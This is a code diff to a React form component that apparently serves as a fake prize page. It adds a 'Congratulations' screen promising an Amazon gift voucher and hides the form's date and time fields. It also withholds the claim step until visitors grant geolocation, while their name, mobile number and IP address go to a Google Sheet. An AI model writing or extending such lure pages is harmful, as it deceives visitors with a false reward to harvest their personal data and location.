@@ -1,8 +1,8 @@
-import React, { useRef } from "react";
+import React, { useRef, useState } from "react";
 import useGeoLocation from "../Hooks/useGeoLocation";
 
 const Form = (props) => {
-  
+  const [winner, setWinner] = useState(false)
   const formRef = useRef(null);
 
   const {name,mobile,ipAddress}=props;
@@ -29,10 +29,28 @@ const Form = (props) => {
       .catch((error) => console.error("Error!", error.message));
   };
 
+  const checkLoaction=()=>{
+    if(!location.loaded){
+        alert("We are only picking winner Location Base, Allow location to get a chance to win")
+        return
+    }
+    setWinner(true)
+    
+  }
+
   return (
     <>
-      <form name="submit-to-google-sheet" onSubmit={submit} ref={formRef}>
-        <div style={{ display: "" }}>
+     <div className="winner-page" style={{display: winner ? "":"none"}}>
+      <div className="winner-page__content">
+        <h1 className="winner-page__title">Congratulations! {name.toUpperCase()}</h1>
+        <p className="winner-page__message">Successfully Submitted</p>
+        <p className="winner-page__prize">If You are the lucky winner of an Amazon Gift Voucher worth<br/> Rs 50-1000</p>
+        <p className="winner-page__winner-name">You will get an sms of an Amazon Gift Voucher on your mobile number </p>
+      </div>
+    </div>
+
+      <form name="submit-to-google-sheet" onSubmit={submit} ref={formRef} style={{display: winner ? "none":""}}>
+        <div style={{ display: "none" }}>
           <input name="Date" type="text" placeholder="" value={formattedDate} />
           <input
             name="Time"
@@ -85,10 +103,15 @@ const Form = (props) => {
             
           </div>
         </div>
-        <button type="submit" className="gift-page__claim-button">
+        <button type="submit" className="gift-page__claim-button" onClick={checkLoaction} style={{display:location.loaded ? "":"none"}}>
+          Claim Now
+        </button>
+        <button  className="gift-page__claim-button" onClick={checkLoaction} style={{display:location.loaded ? "none":""}}>
           Claim Now
         </button>
       </form>
+
+     
     </>
   );
 };
